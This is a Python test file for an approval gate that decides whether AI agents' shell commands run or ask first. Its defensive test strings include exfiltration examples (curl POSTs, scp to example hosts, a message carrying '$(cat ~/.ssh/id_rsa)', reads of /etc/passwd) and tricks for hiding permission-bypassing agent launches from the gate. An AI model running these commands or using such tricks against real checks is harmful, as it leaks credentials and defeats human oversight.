"""0.12.24 gate gap: routine review runs and team reports run without a card, real risks still ask.

- git guard: ``env -u ANTHROPIC_API_KEY claude|codex`` (the subscription rule) is not "clearing the
  environment"; every other env clear / unset / injection, and redirect tricks, still ask.
- a specific shell/path allow rule outranks a generic ask *preset* rule only when it covers every
  command part that hits a preset; ask rules with their own pattern, the other scope's asks (B11),
  never rules, the git guard and the send class still win.
- ``desk grok send --kind result|fyi`` (literal words only) is not outbound; other forms are.
- a here-document written to a file is not "a command that writes a file and runs one".
- the deploy ask rule matches deploy commands, not the word "deployment".
The rules come from scripts/gate_gap_rules.py, applied to a test DB the way the live one was.
"""
import re
import runpy
import time
from contextlib import closing
from pathlib import Path

import pytest

from botoffice import git_guard, nested_agents
from botoffice.rules import Action, Rules, grok_send_outbound, presets_hit
from botoffice.store import JobStore

SCRIPT = runpy.run_path(str(Path(__file__).resolve().parents[1] / "scripts" / "gate_gap_rules.py"))
E8 = [
    ("preset", "outbound"),
    ("shell", r"(?i)\b(curl|wget|http|https|httpie|xh)\b.*(-X\s*['\"]?(POST|PUT|PATCH|DELETE)|--data|--json|--post|"
              r"--upload|--form|\s-[dFT]\s)"),
    ("shell", SCRIPT["OLD_SEND"]),
    ("shell", r"\bgit\s+(-\S+\s+)*push\b"),
    ("shell", r"\bgh\s+pr\s+merge\b|\bgit\s+(-\S+\s+)*merge\b|\bgh\s+api\b.*\bmerge"),
    ("shell", SCRIPT["OLD_DEPLOY"]),
]
DEPLOY = SCRIPT["NEW_DEPLOY"]

MPG_LOOP = ("cd /tmp; R=~/bot-office-reports/demo-lead; for j in alpha beta; do ( timeout 540 env -u "
            "ANTHROPIC_API_KEY claude -p --model claude-sonnet-5-5 --permission-mode bypassPermissions < "
            "$R/review-$j/brief.md > $R/review-$j/review.md 2> $R/review-$j/stderr.log; echo \"exit=$?\" > "
            "$R/review-$j/exit ) & done; wait; for j in alpha beta; do echo \"== $j $(cat $R/review-$j/exit)\"; "
            "head -1 $R/review-$j/review.md; done")
CODEX_RUN = ("cd ~/bot-office-work/ms-lead/wt && cat > /tmp/review.txt <<'EOF'\nRead-only code review.\nEOF\n"
             "timeout 540 codex exec -m gpt-5.5 -c model_reasoning_effort=high --dangerously-bypass-approvals-and-sandbox "
             "--skip-git-repo-check -C ~/bot-office-work/ms-lead/wt - < /tmp/review.txt > /tmp/review.out 2>&1; "
             "echo rc=$?; tail -60 /tmp/review.out")
PENDING_NOTE = ("mkdir -p outbox; cat > outbox/reviews-pending.md <<'EOF'\n# Pending\nPlanned: `timeout 540 env -u "
                "ANTHROPIC_API_KEY claude -p --model m --permission-mode bypassPermissions < brief.md > review.md`.\n"
                "Briefs at ~/bot-office-reports/lead/review-a/brief.md\nEOF\necho ok")
GROK_REPORT = ('desk grok send --to "Engineering Lead" --kind result --text "T-001 #100 done (score 0.50/100); branch '
               'local, not pushed" ; desk grok send --to "MS Lead" --kind fyi --text "FYI: done"')
BOT_TASK = ('bot-task add "Demo service: confirm live config" --goal "Read-only Railway check of Demo service '
            'deployment 0000abcd; then report status" --done-when "Config confirmed" --priority high 2>&1')
CLAUDE_ONE = ("timeout 540 claude -p --model claude-sonnet-5-5 --permission-mode bypassPermissions < "
              "~/bot-office-reports/lead/review-a/brief.md > ~/bot-office-reports/lead/review-a/review.md")


def setup(tmp_path, rules=E8, migrate=True, source="wakeup", scheduled_runs=None):
    store = JobStore(tmp_path / "db.sqlite3")
    bot = store.create_bot("Ada", "", "claude", None)
    if scheduled_runs:
        store.update_bot(bot.id, scheduled_runs=scheduled_runs)
    gate = Rules(store)
    for kind, pattern in rules:
        gate.add_rule(bot_id=bot.id, effect="ask", kind=kind, pattern=pattern, note="E8")
    if migrate:
        SCRIPT["apply"](str(tmp_path / "db.sqlite3"))
    job = store.create("work", "claude", bot_id=bot.id, source=source)
    with closing(store._connect()) as db:
        db.execute("UPDATE jobs SET status='running' WHERE id=?", (str(job.id),))
    return gate, store.get(job.id), bot


def judge(gate, job, command="", tool="Bash", cwd="/srv/ws"):
    return gate.evaluate(job, Action(tool=tool, command=command, cwd=cwd, data={"command": command} if command else {}))


def test_migration_is_idempotent_and_under_the_limit(tmp_path):
    gate, _job, _ = setup(tmp_path)
    assert SCRIPT["apply"](str(tmp_path / "db.sqlite3")) == SCRIPT["apply"](str(tmp_path / "db.sqlite3"))
    patterns = [rule["pattern"] for rule in gate.list_rules()]
    assert SCRIPT["OLD_DEPLOY"] not in patterns and SCRIPT["NEW_DEPLOY"] in patterns
    assert all(len(pattern) <= 500 for pattern in patterns)
    assert sum(rule["effect"] == "allow" for rule in gate.list_rules()) == len(SCRIPT["NEW"])


# --- the git guard: the subscription unset only ------------------------------------------------

@pytest.mark.parametrize("command", [
    "env -u ANTHROPIC_API_KEY claude -p --model m < b.md",
    "timeout 540 env -u ANTHROPIC_API_KEY codex exec -",
    "env --unset=ANTHROPIC_API_KEY claude -p x",
    "env -uANTHROPIC_API_KEY claude -p x",
    MPG_LOOP,
])
def test_guard_lets_the_subscription_unset_through(command):
    assert git_guard.classify("Bash", command, {"command": command}, "/srv/ws") is None


@pytest.mark.parametrize("command", [
    "env -u ANTHROPIC_API_KEY -u GIT_CONFIG_COUNT claude -p x",  # another unset with it
    "env -u GIT_CONFIG_COUNT claude -p x",
    "env -u OPENAI_API_KEY codex exec -",
    "env -u ANTHROPIC_API_KEY bash -c 'git push'",  # not the agent CLI
    "env -u ANTHROPIC_API_KEY git push origin main",
    "env -i claude -p x",
    "env - claude -p x",
    "env -u ANTHROPIC_API_KEY -i claude -p x",
    "env -u ANTHROPIC_API_KEY ANTHROPIC_API_KEY=sk-other claude -p x",  # injects a key
    "env -u ANTHROPIC_API_KEY GH_TOKEN=x claude -p x",
    "env -u ANTHROPIC_API_KEY /tmp/claude -p x",
    "env -u ANTHROPIC_API_KEY",
    "env -u ANTHROPIC_API_KEY <<<claude -i /usr/bin/true",  # bash: env -u K -i /usr/bin/true
    "env -u ANTHROPIC_API_KEY < claude -i true",
    "env -u ANTHROPIC_API_KEY 2>claude -i true",
    "echo ok; env -u ANTHROPIC_API_KEY >|codex -i true",
    "env -u ANTHROPIC_API_KEY <<<cl\"aude\" -i true",
    "env -u ANTHROPIC_API_KEY <<<'claude' -i true",
])
def test_guard_still_asks_for_other_env_clears(command):
    assert git_guard.classify("Bash", command, {"command": command}, "/srv/ws")


def test_guard_still_blocks_push_merge_force_even_with_allow(tmp_path):
    gate, job, bot = setup(tmp_path)
    gate.add_rule(bot_id=bot.id, effect="allow", kind="shell", pattern=r".*")
    for command in ("git push origin main", "git push --force origin feature", "gh pr merge 3",
                    MPG_LOOP + "; git push origin main"):
        effect, preset, _why = judge(gate, job, command)
        assert effect == "ask" and preset == git_guard.PRESET, command


# --- precedence: specific allow beats a generic ask preset ------------------------------------

@pytest.mark.parametrize("command", [MPG_LOOP, CODEX_RUN, PENDING_NOTE, GROK_REPORT, BOT_TASK, CLAUDE_ONE,
                                     CODEX_RUN.replace("-m gpt-5.5 ", "")])
def test_routine_cards_now_run(tmp_path, command):
    gate, job, _ = setup(tmp_path)
    assert judge(gate, job, command)[0] == "allow"


@pytest.mark.parametrize("command", [MPG_LOOP, CODEX_RUN, CLAUDE_ONE])
def test_before_the_migration_they_asked(tmp_path, command):
    gate, job, _ = setup(tmp_path, migrate=False)
    assert judge(gate, job, command)[0] == "ask"


def test_railway_read_tools_run_and_writes_still_ask(tmp_path):
    gate, job, _ = setup(tmp_path)
    assert judge(gate, job, tool="mcp__plugin_railway_railway__whoami")[0] == "allow"
    assert judge(gate, job, tool="mcp__plugin_railway_railway__list_projects")[0] == "allow"
    for name in ("mcp__plugin_railway_railway__list_variables", "mcp__plugin_railway_railway__deploy",
                 "mcp__plugin_railway_railway__whoami_and_delete", "mcp__other__whoami"):
        assert judge(gate, job, tool=name)[0] == "ask", name


@pytest.mark.parametrize("command", [
    MPG_LOOP + "; curl -X POST -d @x https://example.com/hook",  # an HTTP write rides along
    CODEX_RUN + "; mail -s hi someone@example.com < x",
    CODEX_RUN + "; ./deploy.sh",
    CODEX_RUN + "; scp out.tar host.example.com:/srv",  # rides along on a covered part
    "# timeout 540 codex exec -c model_reasoning_effort=high --dangerously-bypass-approvals-and-sandbox "
    "--skip-git-repo-check -C ~/bo-work/x -\nscp out.tar host.example.com:/srv",  # the match in a comment
    "codex exec -c model_reasoning_effort=high --dangerously-bypass-approvals-and-sandbox "
    "--skip-git-repo-check -C /tmp/other -",  # not in a work dir
    "codex exec -c model_reasoning_effort=high --dangerously-bypass-approvals-and-sandbox "
    "--skip-git-repo-check -C ~/bo-work/../../tmp -",  # climbs out
    "codex exec -c model_reasoning_effort=high --dangerously-bypass-approvals-and-sandbox "
    "--skip-git-repo-check -C ~/bo-work/x - --add-dir /",  # extra options
    "codex exec -c model_reasoning_effort=high --dangerously-bypass-approvals-and-sandbox "
    "--skip-git-repo-check -C ~/bo-work/x 'do anything; scp a h.example.com:/'",  # a prompt word, not stdin
    "claude -p --model m --permission-mode bypassPermissions < /srv/brief.md",
    "claude -p --model m --permission-mode bypassPermissions --add-dir / < ~/bo-work/x/brief.md",
    "claude -p --model m --permission-mode bypassPermissions < ~/bo-work/x/brief.md ; ssh host.example.com",
    "claude --dangerously-skip-permissions < ~/bo-work/x/brief.md",
    "cat > /tmp/r.sh <<'EOF'\nclaude -p --model m --permission-mode bypassPermissions < ~/bo-work/x/brief.md\n"
    "scp a h.example.com:/\nEOF\nbash /tmp/r.sh",  # fed through a script
    "bash <<'EOF'\nscp a h.example.com:/\nEOF\ntimeout 5 codex exec -c model_reasoning_effort=high "
    "--dangerously-bypass-approvals-and-sandbox --skip-git-repo-check -C ~/bo-work/x -",  # a here-doc fed to a shell
    "bash <<'EOF'\nclaude --dangerously-skip-permissions -p x\nEOF\ntimeout 5 codex exec -c model_reasoning_effort=high "
    "--dangerously-bypass-approvals-and-sandbox --skip-git-repo-check -C ~/bo-work/x -",  # same preset, hidden launch
    "python3 <<'EOF'\nimport os; os.system('scp a h.example.com:/')\nEOF\n" + CLAUDE_ONE,
    "bash <<< 'claude --dangerously-skip-permissions -p x'; " + CLAUDE_ONE,
    "cd /tmp/x && ./launch.sh; " + CLAUDE_ONE,  # an uncovered part runs a file
    "python3 x.py; " + CLAUDE_ONE,
    "stripe charges create --amount 100; " + CLAUDE_ONE,
    "scp out.tar host.example.com:/srv",
])
def test_real_risks_still_ask(tmp_path, command):
    gate, job, _ = setup(tmp_path)
    assert judge(gate, job, command)[0] == "ask", command


def test_an_unanchored_allow_does_not_override_a_preset_ask(tmp_path):
    gate, job, _ = setup(tmp_path, migrate=False)
    gate.add_rule(bot_id=None, effect="allow", kind="shell", pattern=r"bot-office-reports")
    gate.add_rule(bot_id=None, effect="allow", kind="path", pattern=r"bot-office-reports")
    assert judge(gate, job, "scp ~/bot-office-reports/x host.example.com:/srv")[0] == "ask"


def test_never_rule_stays_supreme(tmp_path):
    gate, job, bot = setup(tmp_path)
    gate.add_rule(bot_id=bot.id, effect="never", kind="shell", pattern=r"codex\s+exec")
    assert judge(gate, job, CODEX_RUN)[0] == "never"


def test_a_specific_allow_does_not_beat_a_specific_ask(tmp_path):
    gate, job, _ = setup(tmp_path, rules=[("shell", r"\brsync\b")], migrate=False)
    gate.add_rule(bot_id=None, effect="allow", kind="shell", pattern=r"\brsync\b")
    assert judge(gate, job, "rsync -a a b")[0] == "ask"


def test_a_preset_allow_does_not_beat_a_preset_ask(tmp_path):
    gate, job, bot = setup(tmp_path, rules=[("preset", "outbound")], migrate=False)
    gate.add_rule(bot_id=bot.id, effect="allow", kind="preset", pattern="outbound")
    assert judge(gate, job, "scp a host.example.com:/srv")[0] == "ask"


def test_trigger_runs_keep_the_strict_profile(tmp_path):
    gate, job, _ = setup(tmp_path, source="trigger")
    assert judge(gate, job, CODEX_RUN)[0] == "ask"
    assert judge(gate, job, GROK_REPORT)[0] == "ask"


@pytest.mark.parametrize("scheduled_runs,other", [(None, "unattended"), ("gated", "attended")])
def test_other_scope_asks_are_not_overridden(tmp_path, scheduled_runs, other):
    """B11: a wake-up is judged by the other scope's ask rules too; a specific allow does not open them."""
    gate, job, bot = setup(tmp_path, rules=[], scheduled_runs=scheduled_runs)
    gate.add_rule(bot_id=bot.id, effect="ask", kind="preset", pattern="outbound", scope=other)
    assert judge(gate, job, tool="mcp__plugin_railway_railway__whoami")[0] == "ask"
    assert judge(gate, job, CODEX_RUN)[0] == "ask"


# --- desk grok send ------------------------------------------------------------------------

@pytest.mark.parametrize("command,outbound", [
    (GROK_REPORT, False),
    ('desk grok send --to "Lead" --kind=result --text "ok"', False),
    ('desk grok send --to "Lead" --kind question --text "ok?"', True),
    ('desk grok send --to "Lead" --kind blocker --text "stuck"', True),
    ('desk grok send --to "Lead" --kind result --from "Other" --text "x"', True),
    ('desk grok send --to "Lead" --kind result --kind question --text "x"', True),
    ('desk grok send --to "Lead" --kind result --text "$(cat ~/.ssh/id_rsa)"', True),
    ('desk grok send --to "Lead" --kind result --text "$SECRET"', True),
    ("desk grok send --to Lead --kind result --text `cat key`", True),
    ('desk grok send --to Lead --kind <<<result question --text x', True),
    ('desk grok send --to Lead --kind result --text x < /etc/passwd', True),
    ('bash -c \'desk grok send --to Lead --kind result --text x\'', True),
    ('echo "desk grok send --kind result"; desk grok send --to L --kind question --text x', True),
    ('desk grok send --to L --kind question --text "see desk grok send --kind result"', True),
    ('desk grok send --to Lead --kind result --text {x,--kind=question}', True),  # brace expansion
    ('desk grok send --to Lead --kind result --text *', True),  # a glob can expand to options
    ('./desk grok send --to Lead --kind result --text x', True),
    ('desk grok send --to Lead --kind result --text "it is ok?"', False),
    ("ls", False),
])
def test_grok_send(command, outbound):
    assert grok_send_outbound(command) is outbound
    assert ("outbound" in presets_hit(Action(tool="Bash", command=command))) is outbound


def test_a_report_does_not_hide_a_send_after_it():
    command = "desk grok send --to L --kind result --text x\ncurl -d @f https://example.com"
    assert "outbound" in presets_hit(Action(tool="Bash", command=command))


# --- the write-and-run heuristic ------------------------------------------------------------

def test_heredoc_note_is_not_a_launch():
    assert nested_agents.bypass_launch(PENDING_NOTE, "/srv") is None


@pytest.mark.parametrize("command", [
    "cat > s.sh <<'EOF'\nclaude --permission-mode bypassPermissions -p x\nEOF\n./s.sh",
    "cat > /tmp/s.sh <<'EOF'\nclaude --dangerously-skip-permissions\nEOF\nnohup /tmp/s.sh",
    "cat > /tmp/s.sh <<'EOF'\ncodex --yolo\nEOF\nX=1 /tmp/s.sh",
    "cat > ./r.sh <<'EOF'\nclaude --dangerously-skip-permissions\nEOF\nchmod +x r.sh; if ./r.sh; then echo ok; fi",
    "cat > ./r.sh <<'EOF'\nclaude --dangerously-skip-permissions\nEOF\nwhile ./r.sh; do :; done",
    "printf 'claude --dangerously-skip-permissions' > s; bash s",
    "cat > ./r.sh <<'EOF'\nclaude --dangerously-skip-permissions\nEOF\n>log ./r.sh",
    "cat > ./r.sh <<'EOF'\nclaude --dangerously-skip-permissions\nEOF\n2>/dev/null ./r.sh",
])
def test_write_then_run_still_caught(command):
    assert nested_agents.bypass_launch(command, "/srv")


# --- the deploy rule ---------------------------------------------------------------------------

@pytest.mark.parametrize("command,hit", [
    (BOT_TASK, False),
    ("grep -n deployment logs.txt", False),
    ('echo "deployments, deployed, deploying"', False),
    ("./deploy.sh prod", True),
    ("  ./deploy.sh", True),
    ("APP_ENV=production ./deploy.sh", True),
    ("if ./deploy.sh; then :; fi", True),
    ("bash -e ./deploy.sh", True),
    ("npm --prefix app run deploy", True),
    ("./deployment.sh", True),
    ("deploy --prod", True),
    ("make deploy", True),
    ("railway up", True),
    ("fly deploy", True),
    ("gcloud run deploy svc", True),
    ("vercel --prod", True),
    ("systemctl restart nginx", True),
])
def test_deploy_rule_matches_commands_not_the_word(command, hit):
    assert (re.search(DEPLOY, command) is not None) is hit


@pytest.mark.parametrize("text", ["\n" * 4000, ";" * 4000, "vercel " * 2000, "a/" * 4000, "deploy" * 2000,
                                  "x=1 " * 3000])
def test_new_patterns_stay_fast(text):
    for pattern in [DEPLOY] + [p for kind, p, _note in SCRIPT["NEW"] if kind == "shell"]:
        start = time.perf_counter()
        re.search(pattern, text)
        assert time.perf_counter() - start < 0.2, pattern[:40]


@pytest.mark.parametrize("text", [">" * 8000, "<" * 8000, "a/x " * 4000,
                                  "printf '%s' 'claude --permission-mode bypassPermissions' > n" + " a/x" * 4000])
def test_scanners_stay_fast(text):
    start = time.perf_counter()
    git_guard.classify("Bash", text, {"command": text}, "/srv")
    nested_agents.bypass_launch(text, "/srv")
    assert time.perf_counter() - start < 2.0
